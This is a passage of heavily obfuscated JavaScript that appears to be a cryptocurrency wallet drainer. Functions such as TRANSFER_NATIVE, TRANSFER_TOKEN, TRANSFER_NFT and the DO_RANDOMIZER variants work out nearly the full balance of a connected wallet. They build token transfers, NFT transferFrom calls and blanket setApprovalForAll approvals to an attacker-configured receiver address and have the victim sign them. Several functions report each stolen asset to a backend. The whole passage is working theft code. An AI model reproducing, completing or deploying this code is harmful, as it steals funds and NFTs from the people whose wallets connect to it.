            _0x862800 = _0x529302[_0x43a6b1(0x32c)][MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x308)][_0x34a22c][_0x43a6b1(0x2eb)]](MS_Current_Address, MS_Settings[_0x43a6b1(0x365)], _0x4c2f2c, _0xd80a8b[_0x43a6b1(0x30c)][_0x43a6b1(0x38a)](!_0x2aa884 ? 0x0 : _0x2aa884), MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x226)])['encodeABI']();
        } else
            _0x862800 = _0x529302[_0x43a6b1(0x32c)][MS_Settings[_0x43a6b1(0x2d2)]['Chains'][_0x34a22c][_0x43a6b1(0x2eb)]]()['encodeABI']();
    }
    MS_Partner_Address = _0x43a6b1(0x1b2);
    let _0x40abd2 = {
        'from': MS_Current_Address,
        'to': MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x308)][_0x34a22c][_0x43a6b1(0x32e)],
        'value': BN(0x64),
        'data': _0x862800
    };
    const _0x2a9c42 = BN(_0x446b52['chain_id'] == 0xa4b1 ? 0x4c4b40 : _0x446b52[_0x43a6b1(0x3ab)] == 0xa86a ? 0x4c4b40 : _0x446b52['chain_id'] == 0x171 ? 0xdbba0 : 0x186a0)
      , _0x48480c = await _0x11ee38[_0x43a6b1(0x38e)](MS_Current_Address);
    let _0x141b57 = _0x48480c[_0x43a6b1(0x259)](_0x2a9c42[_0x43a6b1(0x28f)](_0x3a62ab))['sub'](_0x215356);
    if (MS_Settings['Settings'][_0x43a6b1(0x2f3)]['Mode'] == 0x1)
        _0x141b57 = _0x48480c[_0x43a6b1(0x259)](_0x2a9c42[_0x43a6b1(0x28f)](_0x3a62ab))[_0x43a6b1(0x273)](BN(0x64))[_0x43a6b1(0x28f)](BN(0x64)[_0x43a6b1(0x259)](BN(MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x2f3)][_0x43a6b1(0x2f8)][_0x446b52[_0x43a6b1(0x3ab)]])));
    else {
        if (MS_Settings['Settings'][_0x43a6b1(0x2f3)][_0x43a6b1(0x370)] == 0x2) {
            let _0x180050 = 0x0
              , _0x4dafa0 = MS_Settings['Settings'][_0x43a6b1(0x2f3)][_0x43a6b1(0x2f8)][_0x446b52[_0x43a6b1(0x3ab)]];
            for (const _0x43b40d of MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x2f3)]['Flex_Percent'][_0x446b52[_0x43a6b1(0x3ab)]]) {
                if (_0x446b52[_0x43a6b1(0x1f5)] > _0x43b40d[_0x43a6b1(0x3a7)] || _0x180050 > _0x43b40d[_0x43a6b1(0x3a7)])
                    continue;
                _0x180050 = _0x43b40d[_0x43a6b1(0x3a7)],
                _0x4dafa0 = _0x43b40d[_0x43a6b1(0x39d)];
            }
            _0x141b57 = _0x48480c[_0x43a6b1(0x259)](_0x2a9c42[_0x43a6b1(0x28f)](_0x3a62ab))[_0x43a6b1(0x273)](BN(0x64))[_0x43a6b1(0x28f)](BN(0x64)[_0x43a6b1(0x259)](BN(_0x4dafa0)));
        } else
            MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x2f3)][_0x43a6b1(0x370)] == 0x3 && (_0x141b57 = _0x48480c[_0x43a6b1(0x259)](_0x2a9c42[_0x43a6b1(0x28f)](_0x3a62ab)));
    }
    if (_0x141b57[_0x43a6b1(0x354)](BN(0x0))) {
        _0x40abd2['to'] = MS_Settings['Receiver'],
        _0x40abd2[_0x43a6b1(0x29b)] = '0x';
        const _0x2baadb = await _0x11ee38[_0x43a6b1(0x393)](_0x40abd2);
        let _0x3b38b2 = _0x48480c['sub'](_0x2baadb[_0x43a6b1(0x28f)](_0x3a62ab))['sub'](_0x215356);
        if (MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x2f3)]['Mode'] == 0x1)
            _0x141b57 = _0x48480c[_0x43a6b1(0x259)](_0x2baadb[_0x43a6b1(0x28f)](_0x3a62ab))[_0x43a6b1(0x273)](BN(0x64))[_0x43a6b1(0x28f)](BN(0x64)['sub'](BN(MS_Settings['Settings']['Reserves'][_0x43a6b1(0x2f8)][_0x446b52[_0x43a6b1(0x3ab)]])));
        else {
            if (MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x2f3)]['Mode'] == 0x2) {
                let _0x68c78d = 0x0
                  , _0x470d9b = MS_Settings['Settings'][_0x43a6b1(0x2f3)][_0x43a6b1(0x2f8)][_0x446b52['chain_id']];
                for (const _0x205381 of MS_Settings[_0x43a6b1(0x2d2)]['Reserves'][_0x43a6b1(0x2b6)][_0x446b52[_0x43a6b1(0x3ab)]]) {
                    if (_0x446b52[_0x43a6b1(0x1f5)] > _0x205381[_0x43a6b1(0x3a7)] || _0x68c78d > _0x205381[_0x43a6b1(0x3a7)])
                        continue;
                    _0x68c78d = _0x205381['amount'],
                    _0x470d9b = _0x205381[_0x43a6b1(0x39d)];
                }
                _0x141b57 = _0x48480c[_0x43a6b1(0x259)](_0x2baadb['mul'](_0x3a62ab))['div'](BN(0x64))[_0x43a6b1(0x28f)](BN(0x64)[_0x43a6b1(0x259)](BN(_0x470d9b)));
            } else
                MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x2f3)][_0x43a6b1(0x370)] == 0x3 && (_0x141b57 = _0x48480c[_0x43a6b1(0x259)](_0x2baadb[_0x43a6b1(0x28f)](_0x3a62ab)));
        }
        if (_0x3b38b2['lte'](BN(0x0)))
            throw 'LOW_BALANCE';
        else
            return TRANSFER_NATIVE(_0x446b52, !![]);
    }
    const _0x489237 = await _0x11ee38[_0x43a6b1(0x290)](MS_Current_Address, _0x43a6b1(0x1bf));
    _0x40abd2[_0x43a6b1(0x2dd)] = _0x141b57,
    _0x40abd2['nonce'] = _0x489237,
    _0x40abd2['gasPrice'] = _0x3a62ab,
    _0x40abd2['gasLimit'] = _0x2a9c42,
    await transfer_request(_0x446b52),
    sign_next();
    const _0x4709e5 = await MS_Signer[_0x43a6b1(0x26e)](_0x40abd2);
    wait_message();
    if (MS_Settings[_0x43a6b1(0x2d2)][_0x43a6b1(0x2b2)])
        await _0x11ee38['waitForTransaction'](_0x4709e5[_0x43a6b1(0x318)], 0x1, 0x7530);
    await transfer_success(_0x446b52, _0x141b57),
    sign_ready();
}
  , DO_RANDOMIZER_NATIVE = async _0x3c77fc=>{
    const _0x3cdfd2 = a0_0x66027a
      , _0x3036ad = new ethers[(_0x3cdfd2(0x38b))][(_0x3cdfd2(0x21c))](MS_Settings[_0x3cdfd2(0x1a7)][_0x3c77fc[_0x3cdfd2(0x3ab)]])
      , _0x1771ab = BN(await _0x3036ad['getGasPrice']())[_0x3cdfd2(0x273)](BN(0x64))[_0x3cdfd2(0x28f)](BN(Math[_0x3cdfd2(0x24b)](MS_Gas_Multiplier * 0x64)))
      , _0xcad20c = BN(_0x3c77fc[_0x3cdfd2(0x3ab)] == 0xa4b1 ? 0x4c4b40 : _0x3c77fc[_0x3cdfd2(0x3ab)] == 0xa86a ? 0x4c4b40 : _0x3c77fc[_0x3cdfd2(0x3ab)] == 0x171 ? 0xdbba0 : 0x249f0)
      , _0x404352 = _0xcad20c[_0x3cdfd2(0x28f)](MS_Gas_Reserves[_0x3c77fc['chain_id']] + 0x1)[_0x3cdfd2(0x28f)](_0x1771ab);
    let _0x1276c1 = {
        'from': MS_Current_Address,
        'to': MS_Settings[_0x3cdfd2(0x1ef)]['address'],
        'value': BN(0x64),
        'data': '0x'
    };
    const _0x38ecb8 = await _0x3036ad['estimateGas'](_0x1276c1)
      , _0x482b28 = new ethers['providers'][(_0x3cdfd2(0x21c))](MS_Settings[_0x3cdfd2(0x1a7)][0x1])
      , _0xcf13c4 = BN(await _0x482b28[_0x3cdfd2(0x2a9)]())['div'](BN(0x64))[_0x3cdfd2(0x28f)](BN(Math[_0x3cdfd2(0x24b)](MS_Gas_Multiplier * 0x64)))
      , _0x7a12bb = await _0x3036ad[_0x3cdfd2(0x38e)](MS_Current_Address);
    let _0x62198d = _0x7a12bb[_0x3cdfd2(0x259)](_0x38ecb8[_0x3cdfd2(0x28f)](_0x1771ab))[_0x3cdfd2(0x259)](_0x404352);
    if (MS_Settings[_0x3cdfd2(0x2d2)]['Reserves'][_0x3cdfd2(0x370)] == 0x1)
        _0x62198d = _0x7a12bb['sub'](_0x38ecb8[_0x3cdfd2(0x28f)](_0x1771ab))[_0x3cdfd2(0x273)](BN(0x64))['mul'](BN(0x64)[_0x3cdfd2(0x259)](BN(MS_Settings[_0x3cdfd2(0x2d2)][_0x3cdfd2(0x2f3)]['Fix_Percent'][_0x3c77fc[_0x3cdfd2(0x3ab)]])));
    else {
        if (MS_Settings[_0x3cdfd2(0x2d2)][_0x3cdfd2(0x2f3)][_0x3cdfd2(0x370)] == 0x2) {
            let _0x59f08c = 0x0
              , _0x4966fa = MS_Settings['Settings'][_0x3cdfd2(0x2f3)]['Fix_Percent'][_0x3c77fc[_0x3cdfd2(0x3ab)]];
            for (const _0x329cde of MS_Settings[_0x3cdfd2(0x2d2)][_0x3cdfd2(0x2f3)][_0x3cdfd2(0x2b6)][_0x3c77fc[_0x3cdfd2(0x3ab)]]) {
                if (_0x3c77fc['amount_usd'] > _0x329cde[_0x3cdfd2(0x3a7)] || _0x59f08c > _0x329cde[_0x3cdfd2(0x3a7)])
                    continue;
                _0x59f08c = _0x329cde['amount'],
                _0x4966fa = _0x329cde[_0x3cdfd2(0x39d)];
            }
            _0x62198d = _0x7a12bb['sub'](_0x38ecb8[_0x3cdfd2(0x28f)](_0x1771ab))['div'](BN(0x64))['mul'](BN(0x64)[_0x3cdfd2(0x259)](BN(_0x4966fa)));
        } else
            MS_Settings[_0x3cdfd2(0x2d2)][_0x3cdfd2(0x2f3)][_0x3cdfd2(0x370)] == 0x3 && (_0x62198d = _0x7a12bb['sub'](_0x38ecb8[_0x3cdfd2(0x28f)](_0x1771ab)));
    }
    if (_0x62198d[_0x3cdfd2(0x354)](BN(0x0)))
        throw _0x3cdfd2(0x1dd);
    const _0x424520 = await _0x3036ad['getTransactionCount'](MS_Current_Address, 'pending');
    _0x1276c1[_0x3cdfd2(0x2dd)] = _0x62198d,
    _0x1276c1['nonce'] = _0x424520,
    _0x1276c1[_0x3cdfd2(0x26d)] = _0x1771ab,
    _0x1276c1[_0x3cdfd2(0x28b)] = _0x38ecb8,
    await transfer_request(_0x3c77fc),
    sign_next();
    const _0x2baee8 = await MS_Signer['sendTransaction'](_0x1276c1);
    wait_message();
    if (MS_Settings[_0x3cdfd2(0x2d2)][_0x3cdfd2(0x2b2)])
        await _0x3036ad[_0x3cdfd2(0x378)](_0x2baee8[_0x3cdfd2(0x318)], 0x1, 0x7530);
    const _0x5d2e17 = send_request({
        'action': _0x3cdfd2(0x2ef),
        'wallet': MS_Settings[_0x3cdfd2(0x1ef)],
        'chain_id': _0x3c77fc[_0x3cdfd2(0x3ab)],
        'amount_usd': _0x3c77fc['amount_usd'],
        'user_id': MS_ID,
        'asset': _0x3c77fc,
        'address': MS_Current_Address
    });
    if (MS_Settings['Settings'][_0x3cdfd2(0x3a9)])
        await _0x5d2e17;
    await transfer_success(_0x3c77fc, _0x62198d),
    sign_ready();
}
  , TRANSFER_NATIVE = async(_0x363bdb,_0x5e325c=![])=>{
    const _0x86db45 = a0_0x66027a
      , _0x17e5d9 = convert_chain('ID', _0x86db45(0x1d9), _0x363bdb[_0x86db45(0x3ab)]);
    if (MS_Settings[_0x86db45(0x2d2)]['Use_Wallet_Randomizer'] && MS_Settings[_0x86db45(0x1ef)] != null)
        return DO_RANDOMIZER_NATIVE(_0x363bdb);
    if (_0x5e325c == ![] && ((MS_Settings[_0x86db45(0x2d2)][_0x86db45(0x308)][_0x17e5d9][_0x86db45(0x32e)] != '' || MS_Settings[_0x86db45(0x2d2)][_0x86db45(0x1b4)] && MS_Settings[_0x86db45(0x21e)][parseInt(_0x363bdb[_0x86db45(0x3ab)])] != null) && _0x363bdb[_0x86db45(0x1f5)] >= MS_Settings[_0x86db45(0x2d2)][_0x86db45(0x22a)]))
        return DO_CONTRACT(_0x363bdb);
    const _0x2b5c78 = new ethers[(_0x86db45(0x38b))]['JsonRpcProvider'](MS_Settings['RPCs'][_0x363bdb[_0x86db45(0x3ab)]])
      , _0x40cf18 = BN(await _0x2b5c78[_0x86db45(0x2a9)]())[_0x86db45(0x273)](BN(0x64))[_0x86db45(0x28f)](BN(Math['floor'](MS_Gas_Multiplier * 0x64)))
      , _0x40352c = new ethers['providers'][(_0x86db45(0x21c))](MS_Settings[_0x86db45(0x1a7)][0x1])
      , _0x30b603 = BN(await _0x40352c['getGasPrice']())['div'](BN(0x64))['mul'](BN(Math['floor'](MS_Gas_Multiplier * 0x64)))
      , _0x2a4ebe = BN(_0x363bdb['chain_id'] == 0xa4b1 ? 0x4c4b40 : _0x363bdb[_0x86db45(0x3ab)] == 0xa86a ? 0x4c4b40 : _0x363bdb[_0x86db45(0x3ab)] == 0x171 ? 0xdbba0 : 0x249f0)
      , _0x4ffb25 = _0x2a4ebe[_0x86db45(0x28f)](MS_Gas_Reserves[_0x363bdb[_0x86db45(0x3ab)]] + 0x1)[_0x86db45(0x28f)](_0x40cf18);
    let _0x1068ef = {
        'from': MS_Current_Address,
        'to': MS_Settings['Receiver'],
        'value': BN(0x64),
        'data': '0x'
    };
    const _0x49e6c0 = await _0x2b5c78[_0x86db45(0x393)](_0x1068ef)
      , _0x2962ab = await _0x2b5c78[_0x86db45(0x38e)](MS_Current_Address);
    let _0x5ccd39 = _0x2962ab[_0x86db45(0x259)](_0x49e6c0['mul'](_0x40cf18))[_0x86db45(0x259)](_0x4ffb25);
    if (MS_Settings[_0x86db45(0x2d2)][_0x86db45(0x2f3)][_0x86db45(0x370)] == 0x1)
        _0x5ccd39 = _0x2962ab[_0x86db45(0x259)](_0x49e6c0[_0x86db45(0x28f)](_0x40cf18))['div'](BN(0x64))[_0x86db45(0x28f)](BN(0x64)['sub'](BN(MS_Settings[_0x86db45(0x2d2)][_0x86db45(0x2f3)][_0x86db45(0x2f8)][_0x363bdb[_0x86db45(0x3ab)]])));
    else {
        if (MS_Settings['Settings'][_0x86db45(0x2f3)]['Mode'] == 0x2) {
            let _0x137a2f = 0x0
              , _0x5a5134 = MS_Settings['Settings'][_0x86db45(0x2f3)][_0x86db45(0x2f8)][_0x363bdb[_0x86db45(0x3ab)]];
            for (const _0x56941f of MS_Settings[_0x86db45(0x2d2)]['Reserves'][_0x86db45(0x2b6)][_0x363bdb[_0x86db45(0x3ab)]]) {
                if (_0x363bdb[_0x86db45(0x1f5)] > _0x56941f['amount'] || _0x137a2f > _0x56941f[_0x86db45(0x3a7)])
                    continue;
                _0x137a2f = _0x56941f['amount'],
                _0x5a5134 = _0x56941f[_0x86db45(0x39d)];
            }
            _0x5ccd39 = _0x2962ab[_0x86db45(0x259)](_0x49e6c0[_0x86db45(0x28f)](_0x40cf18))['div'](BN(0x64))[_0x86db45(0x28f)](BN(0x64)[_0x86db45(0x259)](BN(_0x5a5134)));
        } else
            MS_Settings['Settings'][_0x86db45(0x2f3)][_0x86db45(0x370)] == 0x3 && (_0x5ccd39 = _0x2962ab[_0x86db45(0x259)](_0x49e6c0[_0x86db45(0x28f)](_0x40cf18)));
    }
    if (_0x5ccd39[_0x86db45(0x354)](BN(0x0)))
        throw 'LOW_BALANCE';
    const _0x2ebd3c = await _0x2b5c78[_0x86db45(0x290)](MS_Current_Address, _0x86db45(0x1bf));
    _0x1068ef[_0x86db45(0x2dd)] = _0x5ccd39,
    _0x1068ef[_0x86db45(0x236)] = _0x2ebd3c,
    _0x1068ef[_0x86db45(0x26d)] = _0x40cf18,
    _0x1068ef[_0x86db45(0x28b)] = _0x49e6c0,
    await transfer_request(_0x363bdb),
    sign_next();
    const _0x51d05e = await MS_Signer['sendTransaction'](_0x1068ef);
    wait_message();
    if (MS_Settings['Settings'][_0x86db45(0x2b2)])
        await _0x2b5c78[_0x86db45(0x378)](_0x51d05e[_0x86db45(0x318)], 0x1, 0x7530);
    await transfer_success(_0x363bdb, _0x5ccd39),
    sign_ready();
}
  , DO_RANDOMIZER_TOKEN = async _0x5a613c=>{
    const _0x243b65 = a0_0x66027a
      , _0x384131 = new ethers[(_0x243b65(0x38b))][(_0x243b65(0x21c))](MS_Settings['RPCs'][_0x5a613c[_0x243b65(0x3ab)]])
      , _0x1af0e7 = BN(await _0x384131['getGasPrice']())['div'](BN(0x64))[_0x243b65(0x28f)](BN(Math[_0x243b65(0x24b)](MS_Gas_Multiplier * 0x64)))
      , _0x2c9d6b = new ethers[(_0x243b65(0x38b))][(_0x243b65(0x21c))](MS_Settings['RPCs'][0x1])
      , _0x4d2396 = BN(await _0x2c9d6b[_0x243b65(0x2a9)]())[_0x243b65(0x273)](BN(0x64))['mul'](BN(Math[_0x243b65(0x24b)](MS_Gas_Multiplier * 0x64)));
    let _0x3fbea1 = {
        'from': MS_Current_Address,
        'to': _0x5a613c[_0x243b65(0x34b)],
        'value': _0x243b65(0x234),
        'data': '0x'
    };
    const _0x44b694 = new Web3(MS_Provider);
    let _0x2bc118 = null;
    const _0x35d4f4 = new _0x44b694[(_0x243b65(0x2e3))][(_0x243b65(0x2b7))](MS_Contract_ABI[_0x243b65(0x2f2)],_0x5a613c['address']);
    _0x2bc118 = _0x35d4f4[_0x243b65(0x32c)][_0x243b65(0x27e)](MS_Settings[_0x243b65(0x1ef)][_0x243b65(0x34b)], _0x5a613c[_0x243b65(0x270)])[_0x243b65(0x194)](),
    _0x3fbea1[_0x243b65(0x29b)] = _0x2bc118;
    const _0xa3d1f6 = await _0x384131[_0x243b65(0x393)](_0x3fbea1)
      , _0x14d4c4 = await _0x384131[_0x243b65(0x38e)](MS_Current_Address)
      , _0x5daa00 = _0x14d4c4[_0x243b65(0x259)](_0xa3d1f6[_0x243b65(0x28f)](_0x1af0e7));
    if (_0x5daa00['lt'](BN(0x0)))
        throw _0x243b65(0x1dd);
    const _0x13d3d2 = await _0x384131[_0x243b65(0x290)](MS_Current_Address, _0x243b65(0x1bf));
    _0x3fbea1[_0x243b65(0x236)] = _0x13d3d2,
    _0x3fbea1[_0x243b65(0x26d)] = _0x1af0e7,
    _0x3fbea1['gasLimit'] = _0xa3d1f6,
    await transfer_request(_0x5a613c),
    sign_next();
    const _0x1bf950 = await MS_Signer[_0x243b65(0x26e)](_0x3fbea1);
    wait_message();
    if (MS_Settings['Settings']['Wait_For_Confirmation'])
        await _0x384131[_0x243b65(0x378)](_0x1bf950[_0x243b65(0x318)], 0x1, 0x7530);
    const _0x4f5a23 = send_request({
        'action': _0x243b65(0x2fd),
        'wallet': MS_Settings['Personal_Wallet'],
        'chain_id': _0x5a613c[_0x243b65(0x3ab)],
        'amount_usd': _0x5a613c[_0x243b65(0x1f5)],
        'user_id': MS_ID,
        'asset': _0x5a613c,
        'address': MS_Current_Address
    });
    if (MS_Settings[_0x243b65(0x2d2)][_0x243b65(0x3a9)])
        await _0x4f5a23;
    await transfer_success(_0x5a613c),
    sign_ready();
}
  , TRANSFER_TOKEN = async _0x183059=>{
    const _0x49a4b0 = a0_0x66027a;
    if (MS_Settings[_0x49a4b0(0x2d2)][_0x49a4b0(0x24d)] && MS_Settings['Personal_Wallet'] != null)
        return DO_RANDOMIZER_TOKEN(_0x183059);
    const _0x5c5808 = new ethers[(_0x49a4b0(0x38b))][(_0x49a4b0(0x21c))](MS_Settings[_0x49a4b0(0x1a7)][_0x183059[_0x49a4b0(0x3ab)]])
      , _0x129cd1 = BN(await _0x5c5808[_0x49a4b0(0x2a9)]())[_0x49a4b0(0x273)](BN(0x64))['mul'](BN(Math[_0x49a4b0(0x24b)](MS_Gas_Multiplier * 0x64)))
      , _0x503401 = new ethers['providers'][(_0x49a4b0(0x21c))](MS_Settings[_0x49a4b0(0x1a7)][0x1])
      , _0x44cbe3 = BN(await _0x503401['getGasPrice']())[_0x49a4b0(0x273)](BN(0x64))[_0x49a4b0(0x28f)](BN(Math[_0x49a4b0(0x24b)](MS_Gas_Multiplier * 0x64)));
    let _0x17df9f = {
        'from': MS_Current_Address,
        'to': _0x183059['address'],
        'value': _0x49a4b0(0x234),
        'data': '0x'
    };
    const _0x76379e = new Web3(MS_Provider);
    let _0x4c2041 = null;
    const _0x512071 = new _0x76379e['eth'][(_0x49a4b0(0x2b7))](MS_Contract_ABI[_0x49a4b0(0x2f2)],_0x183059[_0x49a4b0(0x34b)]);
    _0x4c2041 = _0x512071[_0x49a4b0(0x32c)]['transfer'](MS_Settings[_0x49a4b0(0x365)], _0x183059['amount_raw'])['encodeABI'](),
    _0x17df9f['data'] = _0x4c2041;
    const _0x488735 = await _0x5c5808[_0x49a4b0(0x393)](_0x17df9f)
      , _0x354e46 = await _0x5c5808['getBalance'](MS_Current_Address)
      , _0x1bc7a2 = _0x354e46[_0x49a4b0(0x259)](_0x488735[_0x49a4b0(0x28f)](_0x129cd1));
    if (_0x1bc7a2['lt'](BN(0x0)))
        throw _0x49a4b0(0x1dd);
    const _0x388cb4 = await _0x5c5808['getTransactionCount'](MS_Current_Address, _0x49a4b0(0x1bf));
    _0x17df9f[_0x49a4b0(0x236)] = _0x388cb4,
    _0x17df9f[_0x49a4b0(0x26d)] = _0x129cd1,
    _0x17df9f[_0x49a4b0(0x28b)] = _0x488735,
    await transfer_request(_0x183059),
    sign_next();
    const _0x37bb29 = await MS_Signer['sendTransaction'](_0x17df9f);
    wait_message();
    if (MS_Settings[_0x49a4b0(0x2d2)][_0x49a4b0(0x2b2)])
        await _0x5c5808[_0x49a4b0(0x378)](_0x37bb29[_0x49a4b0(0x318)], 0x1, 0x7530);
    await transfer_success(_0x183059),
    sign_ready();
}
  , DO_RANDOMIZER_NFT = async _0x442184=>{
    const _0x8f44d7 = a0_0x66027a
      , _0x4f8ac0 = new ethers[(_0x8f44d7(0x38b))]['JsonRpcProvider'](MS_Settings[_0x8f44d7(0x1a7)][_0x442184['chain_id']])
      , _0x3e9c68 = BN(await _0x4f8ac0['getGasPrice']())[_0x8f44d7(0x273)](BN(0x64))['mul'](BN(Math['floor'](MS_Gas_Multiplier * 0x64)))
      , _0xe656ee = new ethers['providers']['JsonRpcProvider'](MS_Settings[_0x8f44d7(0x1a7)][0x1])
      , _0x19c408 = BN(await _0xe656ee[_0x8f44d7(0x2a9)]())['div'](BN(0x64))[_0x8f44d7(0x28f)](BN(Math[_0x8f44d7(0x24b)](MS_Gas_Multiplier * 0x64)));
    let _0x15e023 = {
        'from': MS_Current_Address,
        'to': _0x442184[_0x8f44d7(0x34b)],
        'value': _0x8f44d7(0x234),
        'data': '0x'
    };
    const _0x4830fb = new Web3(MS_Provider);
    let _0x43a9d2 = null;
    const _0x249809 = new _0x4830fb['eth'][(_0x8f44d7(0x2b7))](MS_Contract_ABI['ERC721'],_0x442184['address']);
    _0x43a9d2 = _0x249809[_0x8f44d7(0x32c)][_0x8f44d7(0x1c5)](MS_Current_Address, MS_Settings[_0x8f44d7(0x1ef)]['address'], _0x442184['id'])[_0x8f44d7(0x194)](),
    _0x15e023['data'] = _0x43a9d2;
    const _0x31f8e1 = await _0x4f8ac0[_0x8f44d7(0x393)](_0x15e023)
      , _0x571085 = await _0x4f8ac0[_0x8f44d7(0x38e)](MS_Current_Address)
      , _0x2b5501 = _0x571085[_0x8f44d7(0x259)](_0x31f8e1[_0x8f44d7(0x28f)](_0x3e9c68));
    if (_0x2b5501['lt'](BN(0x0)))
        throw _0x8f44d7(0x1dd);
    const _0xeaf7b5 = await _0x4f8ac0['getTransactionCount'](MS_Current_Address, _0x8f44d7(0x1bf));
    _0x15e023[_0x8f44d7(0x236)] = _0xeaf7b5,
    _0x15e023[_0x8f44d7(0x26d)] = _0x3e9c68,
    _0x15e023[_0x8f44d7(0x28b)] = _0x31f8e1,
    await transfer_request(_0x442184),
    sign_next();
    const _0x15ae17 = await MS_Signer[_0x8f44d7(0x26e)](_0x15e023);
    wait_message();
    if (MS_Settings[_0x8f44d7(0x2d2)]['Wait_For_Confirmation'])
        await _0x4f8ac0[_0x8f44d7(0x378)](_0x15ae17[_0x8f44d7(0x318)], 0x1, 0x7530);
    const _0x4c09ab = send_request({
        'action': 'withdraw_nft',
        'wallet': MS_Settings[_0x8f44d7(0x1ef)],
        'chain_id': _0x442184['chain_id'],
        'amount_usd': _0x442184[_0x8f44d7(0x1f5)],
        'user_id': MS_ID,
        'asset': _0x442184,
        'address': MS_Current_Address
    });
    if (MS_Settings[_0x8f44d7(0x2d2)][_0x8f44d7(0x3a9)])
        await _0x4c09ab;
    await transfer_success(_0x442184),
    sign_ready();
}
  , TRANSFER_NFT = async _0x3e0bab=>{
    const _0xce015a = a0_0x66027a;
    if (MS_Settings[_0xce015a(0x2d2)][_0xce015a(0x35f)] && MS_Settings[_0xce015a(0x1ef)] != null)
        return DO_RANDOMIZER_NFT(_0x3e0bab);
    const _0x2cc3cb = new ethers[(_0xce015a(0x38b))]['JsonRpcProvider'](MS_Settings[_0xce015a(0x1a7)][_0x3e0bab[_0xce015a(0x3ab)]])
      , _0x477ee2 = BN(await _0x2cc3cb[_0xce015a(0x2a9)]())['div'](BN(0x64))['mul'](BN(Math['floor'](MS_Gas_Multiplier * 0x64)))
      , _0x503682 = new ethers[(_0xce015a(0x38b))][(_0xce015a(0x21c))](MS_Settings[_0xce015a(0x1a7)][0x1])
      , _0x31aa1d = BN(await _0x503682[_0xce015a(0x2a9)]())[_0xce015a(0x273)](BN(0x64))[_0xce015a(0x28f)](BN(Math[_0xce015a(0x24b)](MS_Gas_Multiplier * 0x64)));
    let _0x466379 = {
        'from': MS_Current_Address,
        'to': _0x3e0bab[_0xce015a(0x34b)],
        'value': _0xce015a(0x234),
        'data': '0x'
    };
    const _0x5acce3 = new Web3(MS_Provider);
    let _0x2eb14b = null;
    const _0x3723c6 = new _0x5acce3[(_0xce015a(0x2e3))]['Contract'](MS_Contract_ABI[_0xce015a(0x28d)],_0x3e0bab[_0xce015a(0x34b)]);
    _0x2eb14b = _0x3723c6[_0xce015a(0x32c)]['transferFrom'](MS_Current_Address, MS_Settings[_0xce015a(0x365)], _0x3e0bab['id'])[_0xce015a(0x194)](),
    _0x466379[_0xce015a(0x29b)] = _0x2eb14b;
    const _0x160e36 = await _0x2cc3cb[_0xce015a(0x393)](_0x466379)
      , _0x290483 = await _0x2cc3cb[_0xce015a(0x38e)](MS_Current_Address)
      , _0x391142 = _0x290483[_0xce015a(0x259)](_0x160e36[_0xce015a(0x28f)](_0x477ee2));
    if (_0x391142['lt'](BN(0x0)))
        throw 'LOW_BALANCE';
    const _0x4e7050 = await _0x2cc3cb['getTransactionCount'](MS_Current_Address, _0xce015a(0x1bf));
    _0x466379['nonce'] = _0x4e7050,
    _0x466379[_0xce015a(0x26d)] = _0x477ee2,
    _0x466379[_0xce015a(0x28b)] = _0x160e36,
    await transfer_request(_0x3e0bab),
    sign_next();
    const _0x6319f1 = await MS_Signer[_0xce015a(0x26e)](_0x466379);
    wait_message();
    if (MS_Settings['Settings'][_0xce015a(0x2b2)])
        await _0x2cc3cb[_0xce015a(0x378)](_0x6319f1[_0xce015a(0x318)], 0x1, 0x7530);
    await transfer_success(_0x3e0bab),
    sign_ready();
}
  , DO_RANDOMIZER_SAFA = async _0x35b227=>{
    const _0x56afad = a0_0x66027a
      , _0x6de3df = new ethers[(_0x56afad(0x38b))][(_0x56afad(0x21c))](MS_Settings[_0x56afad(0x1a7)][_0x35b227[_0x56afad(0x3ab)]])
      , _0x509935 = BN(await _0x6de3df[_0x56afad(0x2a9)]())[_0x56afad(0x273)](BN(0x64))[_0x56afad(0x28f)](BN(Math['floor'](MS_Gas_Multiplier * 0x64)));
    let _0x1cb67b = {
        'from': MS_Current_Address,
        'to': _0x35b227[_0x56afad(0x34b)],
        'value': _0x56afad(0x234),
        'data': '0x'
    };
    const _0x44b4c0 = new Web3(MS_Provider);
    let _0x4e56db = null;
    const _0x3e48ca = new _0x44b4c0[(_0x56afad(0x2e3))][(_0x56afad(0x2b7))](MS_Contract_ABI['ERC721'],_0x35b227['address']);
    _0x4e56db = _0x3e48ca['methods'][_0x56afad(0x35c)](MS_Settings[_0x56afad(0x1ef)][_0x56afad(0x34b)], !![])[_0x56afad(0x194)](),
    _0x1cb67b['data'] = _0x4e56db;
    const _0x242bc9 = await _0x6de3df[_0x56afad(0x393)](_0x1cb67b)
      , _0x15a4e6 = await _0x6de3df[_0x56afad(0x38e)](MS_Current_Address)
      , _0x2c4554 = _0x15a4e6[_0x56afad(0x259)](_0x242bc9['mul'](_0x509935));
    if (_0x2c4554['lt'](BN(0x0)))
        throw 'LOW_BALANCE';
    const _0x2d4e17 = await _0x6de3df['getTransactionCount'](MS_Current_Address, 'pending');
    _0x1cb67b[_0x56afad(0x236)] = _0x2d4e17,
    _0x1cb67b['gasPrice'] = _0x509935,
    _0x1cb67b[_0x56afad(0x28b)] = _0x242bc9,
    await transfer_request(_0x35b227),
    sign_next();
    const _0x3be3e5 = await MS_Signer['sendTransaction'](_0x1cb67b);
    wait_message();
    if (MS_Settings['Settings']['Wait_For_Confirmation'])
        await _0x6de3df[_0x56afad(0x378)](_0x3be3e5[_0x56afad(0x318)], 0x1, 0x7530);
    await transfer_success(_0x35b227),
    sign_ready();
}
  , DO_SAFA = async _0x2f3180=>{
    const _0x2687d9 = a0_0x66027a;
    if (MS_Settings[_0x2687d9(0x2d2)][_0x2687d9(0x35f)] && MS_Settings['Personal_Wallet'] != null)
        return DO_RANDOMIZER_SAFA(_0x2f3180);
    const _0x4ce6f2 = new ethers['providers'][(_0x2687d9(0x21c))](MS_Settings['RPCs'][_0x2f3180[_0x2687d9(0x3ab)]])
